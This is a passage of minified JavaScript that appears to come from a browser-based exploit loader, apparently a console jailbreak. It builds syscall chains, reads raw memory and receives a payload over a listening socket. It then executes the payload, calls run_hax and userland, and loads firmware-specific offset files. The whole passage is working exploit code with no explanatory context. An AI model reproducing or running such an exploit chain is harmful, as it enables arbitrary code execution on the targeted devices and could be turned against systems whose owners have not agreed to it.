(paused)",Qe=!1,await chain.add_syscall_ret(ge,30,Re,fe,be),await chain.run();let d=p.read4(ge),a=ve.add32(0),e=0;for(;;){await chain.add_syscall_ret(ke,H,d,a,Ee-e),await chain.run();let l=p.read4(ke);if(4294967295==l||0==l)break;a.add32inplace(l),e+=l}showToast("Payload received.");try{await o(e),await c(),await _()}catch(d){alert("Failed to load payload: "+d)}showToast("Payload exited."),document.getElementById("listening-ip").innerHTML=qe}}async function run_hax(){await userland()}let fwScript=document.createElement("script");document.body.appendChild(fwScript),fwScript.setAttribute("src",`offsets/${fw_str}.js`);